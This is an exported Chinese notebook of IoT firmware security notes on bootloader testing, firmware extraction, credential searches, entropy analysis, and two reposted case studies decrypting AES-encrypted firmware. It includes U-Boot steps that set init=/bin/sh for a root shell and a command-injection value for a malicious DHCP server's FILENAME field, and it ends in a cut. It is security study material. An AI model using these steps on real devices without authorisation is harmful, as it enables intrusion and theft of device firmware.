<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>sqliteNoteBook.ctb</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title level-1'>固件</h1><br/><br /></div><div class='page'><h1 class='title level-2'>bootloader</h1><br/><h3>最常见的引导加载程序包括Das uBoot、Redboot、CFE等等。我们将在本系列的后续文章中继续介绍引导加载程序，但现在，我们点到为止。</h3><br /><h3>有关启动加载器的更多信息，请访问：</h3><a href="http://www.informit.com/articles/article.aspx?p=1647051">http://www.informit.com/articles/article.aspx?p=1647051</a><h3>。</h3><br /><br /><strong><h2>加载程序测试</h2></strong><br /><br /><h3>修改设备的引导加载程序时，可以进行如下操作：</h3><br />◇ <h3>在引导过程中加 “0”、空格、或其他标识的“魔术代码”来获取 shell</h3><br /><br /><br />◇ <h3>修改配置以执行 shell 命令，如：引导参数末尾 “init=/bin/sh”</h3><br /><h1>bootloader测试方向（资料来源OWASP固件安全分析手册）</h1><br /><strong><h2>引导加载程序测试</h2></strong><br /><br /><h3>修改设备的引导加载程序时，可以进行如下操作：</h3><br />◇ <h3>在引导过程中加 “0”、空格、或其他标识的“魔术代码”来获取 shell</h3><br /><br /><br />◇ <h3>修改配置以执行 shell 命令，如：引导参数末尾 “init=/bin/sh”</h3><br />#printenv<br />#setenv bootargs=console=ttyS0,115200 mem=63M root=/dev/mtdblock3<br />mtdparts=sflash:&lt;partitiionInfo&gt; rootfstype=&lt;fstype&gt; hasEeprom=0 5srst=0 init=/bin/sh<br />#saveenv<br />#boot<br /><br />◇ <h3>设置一个 tftp 服务器，从本地通过网络加载远程图像（前提是设备有网络访问权限）</h3><br />#setenv ipaddr 192.168.2.2 #local IP of the device<br />#setenv serverip 192.168.2.1 #tftp server IP<br />#saveenv<br />#reset<br />#ping 192.168.2.1 #check if network access is available<br />#tftp ${loadaddr} uImage-3.6.35 #loadaddr takes two arguments: the address to load the file into and the filename of the image on the TFTP server<br /><br />◇ <h3>使用 ubootwrite.py 编写 uboot-image 并且安装修改过的固件来获取 root</h3><br />◇ <a href="https://github.com/HorstBaerbel/ubootwrite">https://github.com/HorstBaerbel/ubootwrite</a><br /><br /><br />◇ <h3>查看启用的调试功能，如：详细记录、加载任意内核、从不受信任的来源引导</h3><br /><br /><br />◇ <h3>使用警告：使用引脚连接主板，观察设备启动顺序，在内核解压缩之前，将连接主板的引脚短路或者连接到 SPI 闪存芯片上的数据引脚（DO）</h3><br /><br /><br />◇ <h3>使用警告：使用引脚连接主板，观察设备启动顺序，在内核解压缩之前，在 U-boot 对 UBI 映像解压缩时，将连接主板的引脚短路或连接到 NAND 闪存芯片的引脚 8 和 9</h3><br />▪ <h3>在短接引脚之前请查看 NAND 闪存芯片的数据表</h3><br /><br /><br />◇ <h3>使用恶意参数配置恶意 DHCP 服务器作为设备在 PXE 引导期间提取的输入</h3><br />▪ <h3>使用 Metasploit DHCP 辅助服务器，进行命令注入，比如修改参数 </h3><code><h3>FILENAME</h3></code><h3> 为 </h3><code><h3>a&quot;;/bin/sh;#</h3></code><h3>，来测试设备启动过程的输入验证</h3><br /><br /></div><div class='page'><h1 class='title level-2'>单片机固件提取</h1><br/>渗透低性能智能设备的关键技术-固件提取(单片机固件提取)<br /><a href="http://blog.nsfocus.net/firmware-extraction/">http://blog.nsfocus.net/firmware-extraction/</a><br />单片机固件提取目标<br /><a href=""><img src="images\746-1.png" alt="images\746-1.png" /></a><br /><br /><a href=""><img src="images\746-2.png" alt="images\746-2.png" /></a><br />	<br />单片机内flash提取方法<br /><a href=""><img src="images\746-3.png" alt="images\746-3.png" /></a><br /><br /><a href=""><img src="images\746-4.png" alt="images\746-4.png" /></a><br />			<br />单片机外flash提取方法<br /><a href=""><img src="images\746-5.png" alt="images\746-5.png" /></a><br />		<br />保护措施<br /><a href=""><img src="images\746-6.png" alt="images\746-6.png" /></a>		</div><div class='page'><h1 class='title level-2'>固件存储位置</h1><br/><a href="中汽研实习--tbox固件存储位置.html">tbox中固件存储位置</a><br /><br />固件在主板上存储的方式，可以简单分成两类：集成式（左图）和分离式（右图）。<br /><a href=""><img src="images\356-1.png" alt="images\356-1.png" /></a><br /><br />集成式存储<br />固件存储在<a href="物联网安全--硬件--硬件概念--MCU.html">mcu</a>中，用于弱设备<br />当设备的功能比较简单，不需要运行复杂的操作系统或者集成复杂的协议栈，也不需要足够强的计算性能，一般厂商会把固件集成到他们的主控芯片中以节约成本。暂且把这类设备称为弱设备。弱设备和个人电脑的组成有很大的不同。一般而言，个人电脑会有非常大的硬盘（10G 以上）来存储操作系统，以满足操作系统的正常运行；而几乎全部的弱设备只需要百 K 容量级别的固件即可正常运行。<br />通过查看mcu中cpu寻址范围，可以确定存储固件的存储器的大小<br /><br />分离式固件存储<br /><a href=""><img src="images\356-2.png" alt="images\356-2.png" /></a><br /><br /><br /></div><div class='page'><h1 class='title level-2'>固件分析</h1><br/><br />重要概念<br /><br />固件加载地址<br />加载地址固件在内存中的加载地址，即正在执行二进制文件在内存中的地址<br />（<h3>当未修改固件加载地址时，IDA Pro仅仅能分析极少数的函数</h3>）<br /><br />固件入口点<br />入口点是固件开始执行的第一条指令的位置，通过在入口点处按c进行代码分析，可以识别出固件代码<br /><br />固件加载地址不等于固件入口点<br /><br />固件函数修复<br />通过确定固件的加载地址、固件入口点，从而正确解析固件中所有函数，同时确定固件中符号表的位置，从而修复固件中所有函数名<br /><br /></div><div class='page'><h1 class='title level-3'>uimage</h1><br/><a href="https://www.jianshu.com/p/01e5dd7c979a">uImage - 简书 (jianshu.com)</a><br /><br />linux内核经过编译后会生成一个ELF格式的可执行程序，叫vmlinux或vmlinuz，是原始的未经任何处理加工的原版内核ELF文件；嵌入式系统烧录的一般不是这个vmlinuz/vmlinux，而是要用objcopy工具制作成烧录镜像格式，经过制作加工成烧录镜像的文件就叫Image（这个制作烧录镜像主要目的就是缩减大小，节省空间）。原则上Image就可以直接被烧录到Flash上进行启动执行（类似于u-boot.bin），但是实际上并不是这样。实际上linux的大牛们觉得Image还是太大了所以对Image进行了压缩，并且在image压缩后的文件的前端附加了一部分解压缩代码，构成了一个压缩格式的镜像就叫zImage。解压的时候，通过zImage镜像头部的解压缩代码进行自解压，然后执行解压出来的内核镜像。uboot为了启动linux内核，还发明了一种内核格式叫uImage。uImage是由uboot编译生成的工具mkimage，可以将zImage加工生成uImage。<br /><br /><strong>Image不关linux内核的事</strong>，linux内核只管生成zImage即可，然后uboot的mkimage工具再去将zImage加工生成uImage来给uboot启动。这个加工过程其实就是在zImage前面加上64字节的uImage的头信息即可。<br /><br /><h3>CPU架构信息已经在升级包中的uimage header</h3></div><div class='page'><h1 class='title level-3'>固件机密凭证搜索</h1><br/><a href="linux--linux敏感目录.html">linux关键目录</a><br /><a href="物联网安全--工具--firmwalker.py.html">使用firmwalker.py脚本</a><br />attify课程笔记-机密信息搜集<br /><br /><br />主要搜索目标<br /><h3>手动静态分析文件系统内容和未编译的代码，或利用诸如Firmwalker之类的自动化工具来分析以下内容：</h3><br /><strong><h3>· </h3></strong><h3>etc / shadow和etc / passwd</h3><br /><strong><h3>· </h3></strong><h3>列出etc / ssl目录</h3><br /><strong><h3>· </h3></strong><h3>搜索与SSL相关的文件，例如.pem，.crt等。</h3><br /><strong><h3>· </h3></strong><h3>搜索配置文件</h3><br /><strong><h3>· </h3></strong><h3>寻找脚本文件</h3><br /><strong><h3>·</h3></strong><h3> 搜索其他.bin文件</h3><br /><strong><h3>· </h3></strong><h3>查找诸如admin，password，remote，AWS key等关键字。</h3><br /><strong><h3>· </h3></strong><h3>搜索物联网设备上使用的通用Web服务器</h3><br /><strong><h3>· </h3></strong><h3>搜索常见的文件，例如ssh，tftp，dropbear等。</h3><br /><strong><h3>· </h3></strong><h3>搜索禁止的C函数</h3><br /><strong><h3>· </h3></strong><h3>搜索常见的命令注入易受攻击的函数</h3><br /><strong><h3>· </h3></strong><h3>搜索URL，电子邮件地址和IP地址</h3><br /></div><div class='page'><h1 class='title level-4'>通过逆向发现后门账户</h1><br/>该固件类型为VxWorks<br /><a href=""><img src="images\656-1.png" alt="images\656-1.png" /></a></div><div class='page'><h1 class='title level-4'>通过字符串检索搜索远程登录账户密码</h1><br/>关键命令<br />grep -iR ‘xxx’<br /><br />搜索telnet凭证<br /><a href=""><img src="images\657-1.png" alt="images\657-1.png" /></a><br /></div><div class='page'><h1 class='title level-3'>固件加密情况分析</h1><br/>		计算出熵变是了解任何给定字节序列的压缩或加密方式的一种非常好的方法，如果计算的结果是高熵，则文件可能被加密或压缩。如果计算的结果是低熵，则文件是不会被加密或压缩。但是，即使熵变被计算出来，你也不容易区分出来。<br />		在此，建议你使用可视化工具，这有助于快速查看熵，以下是一些我用过的非常有用的策略。<br />		binwalk – E<br />		binwalk有一个内置的熵计算器，它可输出一个2D图形，能很好地将熵可视化。但是，由于它是2D图形格式，可数据的一些细微差别可能会被丢失。<br />		熵值越接近1，则说明熵值越高，越可能被加密，熵值越接近0，则说明熵值越低，越不可能被加密<br /><br /><a href=""><img src="images\658-1.png" alt="images\658-1.png" /></a><br /><br /><a href=""><img src="images\658-2.png" alt="images\658-2.png" /></a><br /><br /><br />熵分析时，如果曲线时呈明显波动状或保持为1，则可能是加密的，如果全为0，则可能未加密<br /><a href=""><img src="images\658-3.png" alt="images\658-3.png" /></a><br /><br /><strong>熵分析选项: </strong><br />-E,--entropy  计算文件熵   （计算文件熵，常用命令）<br />-F,--fast  计算更快,但不太详细的熵分析 <br />-J,--save将熵图保存为PNG图像 <br />-Q,--nlegend 从熵图图中省略图例 <br />-N,--nplot 不生成熵图 <br />-H,--high = &lt;float&gt;设置上升沿熵触发阈值(默认值:0.95) <br />-L,--low = &lt;float&gt; 设置下降沿熵触发阈值(默认值:0.85) <br /><br />线上全彩二进制可视化工具<br /><a href="https://binvis.io/#/">https://binvis.io/#/</a></div><div class='page'><h1 class='title level-3'>固件解密</h1><br/>固件加密cve案例<br /><a href="https://github.com/sgayou/subaru-starlink-research">https://github.com/sgayou/subaru-starlink-research</a><br /><br />1、设备旧版本未被加密，指定版本之后，才开始加密，则被加密前的一个版本的固件会包含加密脚本<br />，寻找该中间版本中的加密脚本进行分析<br /><a href="https://cloud.tencent.com/developer/article/1635302">https://cloud.tencent.com/developer/article/1635302</a><br /><a href="https://www.anquanke.com/post/id/198311">https://www.anquanke.com/post/id/198311</a><br /><a href="https://www.freebuf.com/articles/terminal/234978.html">https://www.freebuf.com/articles/terminal/234978.html</a><br />2、设备在bootloader层面进行了加密与校验且一般是对称加密（例如AES），即加解密代码位于bootloader中,即启动代码里存在解密加密数据的算法和密钥，此时需要逆向bootloader<br /><br />固件解密代码多在bootloader与操作系统执行流程之间执行，从而解密文件系统<br />常使用aes对称加密算法<br /><br /></div><div class='page'><h1 class='title level-4'>解密bootloader中的加密算法</h1><br/></div><div class='page'><h1 class='title level-5'>实例1</h1><br/><a href="https://5alt.me/2017/08/%E6%9F%90%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86/">https://5alt.me/2017/08/%E6%9F%90%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86/</a><br /><br /><h1>某智能设备固件解密</h1><br /> <a href="https://5alt.me/2017/08/%E6%9F%90%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86/">2017-08-13</a><br /> <a href="https://5alt.me/categories/%E9%80%86%E5%90%91/">逆向</a><br /><br /><h2>获取固件</h2><br /><h3>拿到硬件设备的第一个想法就是获取固件。通常来说获取固件有三种方式：从设备官方网址下载，抓包固件升级过程，从设备固件存储器中获取。</h3><br /><h3>此设备的官网提供在线升级的功能，升级过程需要读取硬件的一些基本信息，而此设备恰好不被支持。抄起工具把网站日了下来，却发现网站上只提供其他型号的升级包，而且是加过密的。于是只能从现有的设备入手了。</h3><br /><h3>观察电路板，发现板子上主控芯片为ATMEL SAMA5D2系列的芯片，无明显的UART和JTAG接口，存在SOP8封装的型号为N25Q032A的Flash芯片。所以固件只能从Flash里读取出来了。</h3><br /><h3>从Flash里读固件第一步是把芯片从板子上焊下来，对于SOP8封装的芯片建议用电风枪吹下来，血泪教训告诉我们，用电烙铁非常容易把芯片弄坏。</h3><br /><h3>把Flash芯片焊下来之后就是从芯片里读取固件内容了。这里推荐用编程器来读，淘宝一两百人民币就能买到。我们也尝试过用</h3><a href="https://www.flashrom.org/Flashrom">FlashROM</a><h3>来读，但是有时候会很不稳定，对于有的型号并不能完整的将Flash读出来。<br /></h3><br /><br /><h2>固件查看</h2><br /><h3>用 010editor 查看固件，观察固件发现在固件的0x20000偏移处有</h3><code><h3>F1 F2 F3 F4 CD CD CD CD CD CD CD CD 10 BB 00 00</h3></code><h3>开头的疑似加密之后的数据。猜测该部分为加密部分的头，0xBB10为加密部分的长度。同样的结构在0x70000也有。</h3><br /><h3>即固件0x0开始为设备的启动代码，0x20000开始为一段加密数据，0x70000开始为另一段加密数据。</h3><br /><h3>加密数据前16个byte为加密块的头。头结构为<br /></h3><br /><table class="table"><tr><th>1
2
3
4</th><th>0xf4f3f2f1
0xcdcdcdcd
0xcdcdcdcd
data_length</th></tr></table><br /><br /><a href="https://5alt.me/images/201708/EncryptedData.png"><img src="images\795-1.png" alt="images\795-1.png" /></a><h3>EncryptedData</h3><br /><h3>通过主控芯片的手册可知，芯片采用的是ARMv7-A的架构。ARM 是 RISC 指令集，在32位模式下一般为ARM指令集，指令长度固定，默认为小端模式。</h3><br /><h3>将固件载入IDA，选择 ARM Little-endian 的处理器，可以看到程序的汇编代码。我们推测在启动代码里存在解密加密数据的算法和密钥。</h3><br /><a href="https://5alt.me/images/201708/InterruptTable.png"><img src="images\795-2.png" alt="images\795-2.png" /></a><h3>InterruptTable</h3><br /><h3>ARM代码最开始部分为中断向量表。常见的入口代码如下所示。</h3><br /><table class="table"><tr><th>1
2
3
4
5
6
7
8
9
10
11
12
13</th><th>.globl _start
_start:
    b       reset
    ldr     pc, _undefined_instruction
    ldr     pc, _software_interrupt
    ldr     pc, _prefetch_abort
    ldr     pc, _data_abort
    ldr     pc, _not_used
    ldr     pc, _irq
    ldr     pc, _fiq
...
_irq:
        .word irq</th></tr></table><br /><h3>这样当reset的时候，PC会被设置为</h3><code><h3>base+0</h3></code><h3>，遇到</h3><code><h3>undefined_instruction</h3></code><h3>的时候会将PC设置为</h3><code><h3>base+4</h3></code><h3>。reset指向的函数地址为初始化代码以及程序逻辑真正的入口。</h3><br /><h3>从IDA里可以看到，该固件开始部分汇编代码符合入口的特征。</h3><br /><br /><h2>寻找固件基址</h2><br /><h3>对于这种没有底层操作系统的固件来说，第一步要找到基址，这是二进制文件加载到内存后在内存的地址。如果不调整基址，代码中有些绝对地址寻址的指令，寻找数据的时候可能对应不上。</h3><br /><h3>一种方法是根据代码中的load指令寻找载入立即数的操作，来猜测基址。<br />在ARM中，大部分的load指令为相对寻址，载入相对于当前PC某个偏移处的内存内容，这个内容往往是一个绝对的在固件运行时的地址（即加上了基址之后的地址）。而在ida里，对于这种情况进行了显示上的处理，会直接显示将这个绝对的地址加载到寄存器里。可以根据load指令加载的地址猜测出一个基址来，如果一些内存能成功的找到xref，即说明基址找的是正确的。一个自动化寻找基址的方案是，用strings找出字符串在文件中的偏移，在ida里找出所有load指令加载的地址，爆破基址，当字符串的偏移加上基址能在load指令加载的地址里找的时，这个基址有很大可能为正确的基址。</h3><br /><h3>另外，对于一个嵌入式设备来讲，一般会将ROM加载到内存中然后执行。查看芯片的手册，手册中的内存设备地址一般为基址。如果外部flash存放的代码是一个bootloader，那么逆向可以获得下一步程序加载的基址。（一般用于固件解密后跳转到真正的代码执行）</h3><br /><h3>对于其他情况，如果固件能通过binwalk识别出u-boot image，在信息里会输出基址，因为在u-boot image的文件头中存有基址信息。</h3><br /><h3>在这里，我们找到固件的基址为</h3><code><h3>0x200000</h3></code><h3>。</h3><br /><br /><h2>固件逆向</h2><br /><h3>由于固件有部分数据是加密过的，在运行的时候一定会存在解密操作。用IDA的Find Crypt插件寻找常用密码学算法的常量，发现代码中存在sha256和sha512算法。同时在芯片的手册中发现有硬件AES模块，在此CPU中，AES硬件模块的基址为</h3><code><h3>0xF002C000</h3></code><h3>。在IDA中寻找该立即数即可找到固件中调用硬件AES的代码，根据手册中对应位置内存的功能对代码中函的进行标记。对于这些特殊的地址，在逆向过程中边查手册边将其功能标记出来。</h3><br /><a href="https://5alt.me/images/201708/AESCtrolRegister.png"><img src="images\795-3.png" alt="images\795-3.png" /></a><h3>AESCtrolRegister</h3><br /><a href="https://5alt.me/images/201708/AESFunctions.png"><img src="images\795-4.png" alt="images\795-4.png" /></a><h3>AESFunctions</h3><br /><h3>我们发现，与AES相关的函数地址以及sha256的地址被存放在了内存中的某个区域，在一段疑似对数据块解密的函数中进行了调用。<br />此函数先判断了数据块是否以</h3><code><h3>0xf4f3f2f1</h3></code><h3>开头，并检查其长度是否小于0x30000并且是否为0x40的倍数。然后就是获取芯片的序列号并做sha256作为key1，然后把序列号进行byte交换，sha256后作为key2，设置IV为</h3><code><h3>\x00\x10\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x20\x00\x00\x00</h3></code><h3>，对前一半的数据用key1解，后一半的数据用key2解。解完之后得到真正的逻辑代码。</h3><br /><h3>按照这个逻辑看来，固件的解密需要获取芯片的序列号，每个芯片的系列号都不相同，所以每个板子中的固件也都不一样。问题来了，我们怎么才能拿到芯片的序列号呢？</h3><br /><br /><h2>解密固件</h2><br /><h3>为了解密固件，我们需要拿到芯片的序列号作为AES的key。网上搜了一会也没搜到有用的信息。由于板子上也没有可以连接电脑输出的接口，即使读到了也很难将其输出出来。难道要从板子上找个灯，将读到的序列号通过控制灯的亮灭一位一位的输出出来吗。。</h3><br /><h3>该设备可以将配置的修改保存下来，那么就一定有写回 flash 的方法。我们可以把序列号读出来之后再写回 flash，这样再读一次flash就能得到序列号了。FLash芯片在写之前需要先erase。因为Flash的write只能使bit从1变成0，而Flash erase会把所有的bit设置为1。</h3><br /><h3>修改固件代码，把读取序列号并写回flash的shellcode填入，焊回flash芯片上电运行一段时间，取下flash，读取出里面的序列号即可解密固件。<br />由于芯片的序列号是有规律的，我们可以通过暴力序列号的一部分来解密其他设备的固件。</h3><br /><h3>在固件里也发现了一个固定的AES密钥，猜测是用来解密升级固件的，尝试用来解密官网上的其他型号的固件升级包失败。</h3><br /><br /><h2>最后</h2><br /><h3>对于智能设备的固件，厂商很难保证固件不被攻击者拿到。对固件的加密只能增加攻击者获取固件的难度。对于小型的设备最好的方法是把固件保存在主控芯片内的rom中，或者将核心的解密逻辑放在主控芯片内，这样攻击者很难获取到主控芯片内的flash中存储的数据，使固件不能被以较低成本获取。</h3><br /><h3>在逆向的过程中，由于固件的代码没有外部函数的调用，可以用模拟器来模拟执行一些代码段辅助逆向。</h3><a href="https://github.com/5alt/emu">emu</a><h3>是基于unicorn的一个模拟执行辅助脚本，根据</h3><a href="https://github.com/36hours/idaemu">idaemu</a><h3>修改而来，欢迎一起共同维护。</h3><br /><h3>感谢hyperchem大佬带我飞！</h3><br /><br /><h2>参考资料</h2><br /><a href="https://reverseengineering.stackexchange.com/questions/13948/how-to-find-bootloader-load-address">https://reverseengineering.stackexchange.com/questions/13948/how-to-find-bootloader-load-address</a><br /><a href="http://stackoverflow.com/questions/21312963/arm-bootloader-interrupt-vector-table-understanding">http://stackoverflow.com/questions/21312963/arm-bootloader-interrupt-vector-table-understanding</a><br /><a href="https://sviehb.wordpress.com/2011/09/09/reverse-engineering-an-obfuscated-firmware-image-e02-analysis/">https://sviehb.wordpress.com/2011/09/09/reverse-engineering-an-obfuscated-firmware-image-e02-analysis/</a><br /><a href="https://github.com/5alt/emu">https://github.com/5alt/emu</a><br /><br /></div><div class='page'><h1 class='title level-6'>截图</h1><br/><a href=""><img src="images\796-1.png" alt="images\796-1.png" /></a></div><div class='page'><h1 class='title level-5'>实例2</h1><br/><a href="https://cloud.tencent.com/developer/article/1005700">https://cloud.tencent.com/developer/article/1005700</a><br /><br /><h1>四个字节的安全 ：一次固件加密算法的逆向分析</h1><br /><span style="color:#a8a095;">2017-08-16阅读 2.5K</span>0<br /><strong>作者</strong>：马卓<br /><strong>导语</strong> 本研究由hyperchemma和saltzhou共同完成。这篇文章源自我们的一个检测项目，项目中我们需要对设备的固件进行分析，在整个固件分析的过程中我们克服了很多困难，最后完整解密了设备固件的内容，这里将相关的内容做个记录。<br /><br /><br /><h2>设备介绍</h2><br />设备采用ATMEL SAMA5D2系列的SOC作为主控芯片。该芯片基于ARM Cortex-A5内核，支持SPI、I2C等总线。支持USB外部设备。同时该芯片内置基于硬件的算法加速器，支持SHA1、SHA256等哈希算法，支持AES，3DES等对称加密算法。<br /><br /><h2>获取固件</h2><br />设备主板如下。通过观察主板，我们并没有在主板上发现常见的UART，JTAG等调试接口，这使得我们无法动态观察设备固件的运行方式。随后我们发现设备组主板上发现一个flash芯片，型号是N25Q032A，这个flash的大小是4MB。通过阅读主控芯片的手册，我们发现，这个款芯片内部容量有限，多采用外置flash的方式存储代码，因此我们推测这个flash中应该包含设备的主要代码，接着我们使用编程器我们完整读取了flash芯片的内容。<br /><br /><a href="https://blog-10039692.file.myqcloud.com/1502761829544_355_1502761830040.jpg"><img src="images\797-1.png" alt="images\797-1.png" /></a><br /><br /><h2>分析固件</h2><br />获得设备固件后，我们着手开始对固件文件进行分析。初步观察发现，flash固件大致分为几个区域：<br /><span style="color:#f19250;">0x000000</span><span style="color:#6ecfce;">-</span><span style="color:#f19250;">0x020000</span> 这个部分是设备的启动的代码<br /><span style="color:#f19250;">0x020000</span><span style="color:#6ecfce;">-</span><span style="color:#f19250;">0x070000</span> 第一个加密块<br /><span style="color:#f19250;">0x070000</span><span style="color:#6ecfce;">-</span><span style="color:#f19250;">0x200000</span> 第二个加密块<br /><span style="color:#f19250;">0x200000</span><span style="color:#6ecfce;">-</span><span style="color:#f19250;">0x400000</span> 配置数据保存快 Flash中一共有两个加密的区域，推测这两个区域应该是整个固件的真正的代码，硬件厂商为了保护代码而对这部分代码进行了加密。下面就来探讨一下如何解密这两块加密的代码。<br /><br />每个加密块的结构如下，其中有两个字段比较关键，一个是加密块的大小和加密后的数据。<br />typedef struct _encryptblock<span style="color:#373c43;">{</span><br />DWORD MAGIC<span style="color:#373c43;">;</span> <span style="color:#a8a095;">//0xf4f3f2f1</span><br />BYTE dummy<span style="color:#373c43;">[</span><span style="color:#f19250;">8</span><span style="color:#373c43;">];</span> <span style="color:#a8a095;">//0xCD</span><br />int Size<span style="color:#373c43;">;</span><br />BYTE encryptedData<span style="color:#373c43;">[</span><span style="color:#f19250;">0</span><span style="color:#373c43;">];</span> <span style="color:#a8a095;">//encrypted data</span><br /><span style="color:#373c43;">}</span> encryptblock<span style="color:#373c43;">;</span>加密块的结构中不存在密钥字段，因此我们需要弄清楚这部分数据是什么算法加密的，以及密钥在哪里。Flash的开头部分包含部分代码，这部分代码是设备的启动代码，从逻辑上应该存在这部分加密块的解密算法和密钥，因此我们尝试对这部分代码进行逆向分析。<br /><br />设备启动代码是设备启动阶段执行的代码，这部分代码通常不具备文件格式，代码也是在一个预先设定好的绝对物理地址上执行的。因此在对这部分代码进行逆向分析之前，首先我们需要确定这部分代码的基址，通过阅读芯片手册和对代码进行检查，我们确定这部分代码执行的基址是0x200000。加载到IDA中，我们在入口看到了这样的代码：<br /><br /><a href="https://blog-10039692.file.myqcloud.com/1502761947735_9123_1502761948059.png"><img src="images\797-2.png" alt="images\797-2.png" /></a><br />入口处有几个跳转指令，第一条是跳转到启动代码的真实入口，其他是跳转是跳转到相应的中断处理函数上。<br /><br />通过定位特征数据和跟踪代码执行流，我们定位到了解密函数，下面就这部分代码的流程进行分析：<br /><br /><a href="https://blog-10039692.file.myqcloud.com/1502761977748_8901_1502761978186.png"><img src="images\797-3.png" alt="images\797-3.png" /></a><br />首先程序会读取第一个加密块的头部四个字节，比较是否是0xF4F3F2F1,检查合法性。然后程序会读取加密块的大小，并检查大小是否大于0x30000，同时检查数据块大小是否是0x40的倍数。<br /><br /><a href="https://blog-10039692.file.myqcloud.com/1502762000122_540_1502762000474.png"><img src="images\797-4.png" alt="images\797-4.png" /></a><br />经过上面的检查后，程序会加密的内容以0x40大小为单位复制到绝对地址0x20800000。<br /><br /><a href="https://blog-10039692.file.myqcloud.com/1502762062845_2116_1502762063227.png"><img src="images\797-5.png" alt="images\797-5.png" /></a><br />经过上面的操作后，程序会将加密的数据分成两部分，分别用两个密钥:key1和key2，使用AES算法进行解密。解密到物理地址0x23F00000。至此，解密过程就算完成了。但是对于解密算法的相关的细节我们还没完全弄清楚。下面我们来逐一对解密的细节进行分析。<br />首先我们先看看是如何确定加密算法的。通过逆向分析，我们发现程序调用了下面这样一段代码： <br /><br /><a href="https://blog-10039692.file.myqcloud.com/1502762097860_2515_1502762098163.png"><img src="images\797-6.png" alt="images\797-6.png" /></a><br />从代码上看，0xF002C000这个地址已经超过当前固件的地址范围了，那这个操作的含义是什么呢？ 通过查找芯片手册 ，我们这个地址其实是芯片内部的寄存器，名称为AES_Control Register.<br /><br /><a href="https://blog-10039692.file.myqcloud.com/1502762115989_7284_1502762116345.png"><img src="images\797-7.png" alt="images\797-7.png" /></a><br />上面代码的含义就是重置AES硬件加密引擎。<br /><br />在知道了加密算法是AES，我们需要确定该算法的两个要素，一个是初始化向量（IV），一个是密钥。我们先看看IV是从哪里来的。<br /><br />通过分析，我们发现IV被保存在0x00209FA4这个地址。而对这个地址的赋值代码如下：<br /><br /><a href="https://blog-10039692.file.myqcloud.com/1502762154420_4668_1502762154724.png"><img src="images\797-8.png" alt="images\797-8.png" /></a><br />上面代码告诉我们，IV的长度是16字节，分成四个部分，分别保存在R1,R2,R3和R12中， IV=&quot;\x00\x10\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x20\x00\x00\x00&quot;。<br /><br />最后我们来分析一下解密密钥的来源。解密过程中共需要两个密钥key1和key2。这两个密钥来自同一个来源，因此我们这里对key1的来源着重进行分析。<br /><br />生成密钥的时候首先调用了下面的函数：<br /><br /><a href="https://blog-10039692.file.myqcloud.com/1502762177456_7149_1502762177790.png"><img src="images\797-9.png" alt="images\797-9.png" /></a><br />函数中的0xF8030050同样是一个芯片内部寄存器，这个地址和0xF803004C分别保存了4个字节芯片序列号，共计8个字节，这8个字节的序列号是唯一的，对每个芯片都不一样。这个函数就是获取当前芯片的序列号，这里我们把得到的数据记作SN0+SN1。<br /><br />在读取到芯片序列号后，程序会调用一个函数生成32字节的key1，然后再对序列号进行换位，再次用同样的函数生成32字节的key2。那么这个函数到底是什么怎样把序列号计算成密钥的呢？ 经过初步分析，我们在函数中发现了SHA256算法中使用的到常量，但是这个函数的代码并未采用标准库的代码，因此确定这个函数是否是标准的SHA256算法需要对代码进行详细的比对，这个过程会很耗时，因此我们想到了另一种方法来验证代码是否为标准SHA256。<br /><br />我们可以肯定这部分代码是个纯算法的代码 ，因此不涉及到任何与硬件交互和操作的代码。因此我们将这段代码在模拟执行环境中执行并检查结果，如果得到的结果与我们使用标准算法计算的结果一致则表明这段代码就是标准的SHA256算法。<br /><br />我们选择的模拟执行环境是Unicorn，一个基于qemu修改的CPU模拟器，支持各种语言的开发，下面是我们用python编写的模拟执行的代码。<br /><br /><a href="https://blog-10039692.file.myqcloud.com/1502762214090_1133_1502762214480.png"><img src="images\797-10.png" alt="images\797-10.png" /></a><br />通过上面代码的输出结果，我们确定了上面的算法输出的结果与标准SHA256算法一致。<br /><br />至此，我们就分析清楚了固件的解密算法以及密钥来源，但是还有一个遗留的问题，就是如何的获取生成密钥芯片序列号。<br /><br />前面提到，芯片序列号是唯一的，我们无法使用一个设备的密钥解密另一个设备的固件。因此我们需要的获得当前设备主控芯片的序列号。<br /><br />由于设备不存在可用的输出接口，因此我们能想到的唯一能获取芯片序列号的方法就是patch固件，同时我们还需要将获取到序列号输出到能够放访问到的地方，这里我们采用了写flash的方法。下面是我们写的对固件的patch代码。<br /><br /><a href="https://blog-10039692.file.myqcloud.com/1502762253094_5329_1502762253456.png"><img src="images\797-11.png" alt="images\797-11.png" /></a><br />我们将修改过的固件烧入flash中，并重新焊接回去，在设备上电执行一段时间以后，再取下flash，读取其中的内容，这样我们就获得了当前芯片的序列号。<br /><br />获取序列号以后，我们就可以按照之前的分析的算法对固件内容进行解密了。<br /><br />最后我们还遗留一个问题，就是如何解密其他设备的固件。其实这个问题很好解决，因为芯片生产厂商在为每个芯片设置序列号时并不是采用全随机的方式，序列号之间存在一定联系和规律，因此我们可以假设序列号中的前面四个字节是固定的，而后面四个字节是不同的，然后暴力穷举这四个字节的内容。实践中我们使用这个方法成功解密了另外两台设备的固件。<br /><br /><br /><h2>结论</h2><br />在本文中我们逆向了一款设备固件的加密算法，同时采用了模拟执行的方式确认了固件中的算法。最后我们发现整个设备固件的安全体系只依赖于四个字节的数据，在了解了相关的算法后，这种加密保护方式很容易被攻破。<br /><br /><br /><br /></div><div class='page'><h1 class='title level-6'>截图</h1><br/><br /><a href=""><img src="images\798-1.png" alt="images\798-1.png" /></a></div><div class='page'><h1 class='title level-4'>使用aes加密固件</h1><br/><a href="http://bbs.ebaina.com/thread-5000-1-1.html">http://bbs.ebaina.com/thread-5000-1-1.html</a><br /><br /><a href=""><img src="images\799-1.png" alt="images\799-1.png" /></a><br /><br /><br /><a 